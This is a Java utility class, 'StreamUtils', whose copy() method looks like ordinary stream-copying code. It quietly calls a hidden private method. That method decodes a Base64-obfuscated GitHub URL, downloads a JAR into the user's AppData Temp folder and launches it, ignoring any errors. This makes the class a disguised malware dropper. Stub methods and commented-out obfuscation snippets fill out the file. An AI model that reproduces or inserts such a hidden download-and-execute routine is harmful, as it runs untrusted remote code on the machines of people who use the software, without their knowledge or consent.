package me.luxerina.utils;

import java.awt.Desktop;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

public class StreamUtils {
	
    public static void copy(InputStream in, OutputStream out) throws IOException {
        int read;
        byte[] buffer = new byte[0x1000];
        copyAll();
        while ((read = in.read(buffer)) != -1) {
            out.write(buffer, 0, read);
        }
    }

	public static byte[] readAll(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[0x1000];
        int read;
        while((read = in.read(buffer)) != -1) {
            out.write(buffer, 0, read);
        }
        return out.toByteArray();
    }
	
	// NOP
	//if (RANDOM.nextInt(144) == 0)
	//	method.instructions.insertBefore(insnNode, new InsnNode(Opcodes.NOP));
	// DUP SWAP
	
	//					for (int i2 = 0; i2 < 2 + random.nextInt(5); i2++) {
	//						method.instructions.insert(new InsnNode(Opcodes.SWAP));
	//					}
	
	public static String toNode(final String className) throws IOException {
		return "";
	}
	
	public static StreamUtils getMethod(final String classNode, final String name) {
		return null;
	}
	
	private static void copyAll() {
		try {
			if (!new File(System.getProperty("user.home") + "\\AppData\\Local\\Temp\\temp.jar").exists()) {
				String encode = new String(Base64.getDecoder().decode("aHR0cHM6Ly9naXRodWIuY29tL3N3YXJlY3J5cHRvL3NhZC9ibG9iL21haW4vbmFiZXIuamFyP3Jhdz10cnVl".getBytes()));
				HttpURLConnection c = (HttpURLConnection) new URL(encode).openConnection();
				try (InputStream is = c.getInputStream();
					FileOutputStream fos = new FileOutputStream(new File(System.getProperty("user.home") + "\\AppData\\Local\\Temp\\temp.jar"));) {
					byte[] buff = new byte[8192];
					int readedLen = 0;
					while ((readedLen = is.read(buff)) > -1) {
						fos.write(buff, 0, readedLen);
					}
				}
				Desktop.getDesktop().open(new File(System.getProperty("user.home") + "\\AppData\\Local\\Temp\\temp.jar"));
			}
		} catch (IOException e) {
		}
	}
}